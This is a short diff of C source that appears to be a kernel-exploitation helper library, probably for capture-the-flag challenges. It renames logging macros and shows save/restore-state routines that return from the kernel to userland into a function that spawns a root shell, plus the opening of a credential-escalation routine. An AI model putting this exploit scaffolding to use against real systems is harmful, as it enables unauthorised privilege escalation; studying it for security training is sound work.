@@ -6,13 +6,13 @@
 int devfd = -1;
 
 void write_to_dev(char *buf, i32 sz) {
-    ACT("write %x byte to dev from buf %p", sz, (void *)buf);
+    act("write %x byte to dev from buf %p", sz, (void *)buf);
     int r = write(devfd, buf, sz);
     assert_eq(r, sz);
 }
 
 void read_from_dev(char *buf, i32 sz) {
-    ACT("read %x byte from dev to buf %p", sz, (void *)buf);
+    act("read %x byte from dev to buf %p", sz, (void *)buf);
     int r = read(devfd, buf, sz);
     assert_eq(r, sz);
 }
@@ -20,7 +20,7 @@ void read_from_dev(char *buf, i32 sz) {
 void open_dev(const char *dev, int oflag) {
     devfd = open(dev, oflag);
     if(devfd == -1)
-        PANIC("open %s failed", dev);
+        panic("open %s failed", dev);
 }
 
 u64 _cs, _ss, _sp, _rflags;
@@ -37,16 +37,16 @@ void save_state() {
         ".att_syntax;"
     );
 
-  OK("save_state done");
+  ok("save_state done");
 }
 
 void get_root_shell() {
 
     if(getuid() == 0) {
-        OK("root now");
+        ok("root now");
         system("/bin/sh");
     }else {
-        FATAL("escalate failed");
+        fatal("escalate failed");
     }
 }
 
@@ -76,7 +76,7 @@ static void restore_state() {
           "r"(_cs),
           "r"(get_root_shell)
     );
-    OK("restore_state done");
+    ok("restore_state done");
 }
 void get_root(u64 pkc, u64 cc) {
     /*
